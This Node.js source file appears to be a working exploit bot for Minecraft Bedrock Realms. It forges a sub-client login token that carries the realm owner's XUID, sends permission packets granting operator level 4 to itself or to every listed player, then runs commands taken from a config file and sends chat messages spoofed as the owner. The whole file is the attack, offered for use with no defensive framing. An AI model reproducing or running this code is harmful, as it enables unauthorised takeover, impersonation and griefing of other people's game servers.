const JWT = require("jsonwebtoken");
const { opAll, botName, commands, messages } = require("./config.json");
const { createClient } = require("bedrock-protocol");
const { v4: uuidv4 } = require("uuid");

const algorithm = 'ES384';

let entity_unique_id;

module.exports.main = (realmData) => {
	console.log(`Joining realm: ${realmData.name} (${realmData.id})`);
	
	console.log(realmData.ip, realmData.port);
	const client = createClient({
		host: realmData.ip,
		port: realmData.port,
		profilesFolder: "./authCache",
		skipPing: true,
		skinData: {
			CurrentInputMode: 3,
			DefaultInputMode: 3,
			DeviceModel: 'Xbox Series X',
			DeviceOS: 11
		}
	});

	if(opAll) {
		let packetCount = 0;
		client.on("player_list", (packet) => {
			packetCount++;
			if(packetCount === 1) return;

			console.log("Got player list. Starting the funny...");

			splitScreenJoin(client, realmData);

			const records = packet.records.records;

			for(const player of records) {
				client.write("request_permissions_2", {
					entity_unique_id: player.entity_unique_id,
					permission_level: 4,
					requested_permissions: {
						_value: 255,
						build: true,
						mine: true,
						doors_and_switches: true,
						open_containers: true,
						attack_players: true,
						attack_mobs: true,
						operator: true,
						teleport: true
					}
				});
			}

			finalActions(client, realmData);
		});
	} else {
		client.on("update_abilities", (packet) => {
			if(entity_unique_id) return;
			entity_unique_id = packet.entity_unique_id;

			console.log("Got entity unique id. Starting the funny...");

			splitScreenJoin(client, realmData);

			client.write("request_permissions_2", {
				entity_unique_id: entity_unique_id,
				permission_level: 4,
				requested_permissions: {
					_value: 255,
					build: true,
					mine: true,
					doors_and_switches: true,
					open_containers: true,
					attack_players: true,
					attack_mobs: true,
					operator: true,
					teleport: true
				}
			});

			finalActions(client, realmData);
		});
	}
};

function splitScreenJoin(client, realmData) {
	const payload = {
		extraData: {
			XUID: realmData.ownerUUID,
			displayName: botName ?? "Isaac George",
			identity: uuidv4()
		},
		identityPublicKey: client.clientX509,
	};

	const privateKey = client. ecdhKeyPair.privateKey;

	const identity = JWT.sign(payload, privateKey, { algorithm: algorithm, noTimestamp: true, notBefore: 0, expiresIn: 60 * 60, header: { x5u: client. clientX509, typ: undefined } });

	const chain = [
		identity
	];

	const identityChain = JSON.stringify({chain});

	const tokens = {
		tokens: {
			identity: identityChain,
			client: client.clientUserChain
		}
	};

	client.write("sub_client_login_2", tokens);
}

function finalActions(client, realmData) {
	console.log("You are now OP!");

	// run all commands from config.json
	for(const command of commands) {
		client.write("command_request_2", {
			command: command,
			origin: {
				type: 0,
				uuid: "",
				request_id: ""
			},
			internal: false,
			version: 66
		});

		console.log(`Executed command: ${command}`);
	}

	for(const message of messages) {
		client.write("text_2", {
			type: "chat",
			needs_translation: false,
			source_name: botName ?? "Isaac George",
			message: message,
			xuid: realmData.ownerUUID,
			platform_chat_id: ""
		});

		console.log(`Sent message: ${message}`);
	}

	setTimeout(() => {
		client.disconnect();
	}, 500);
}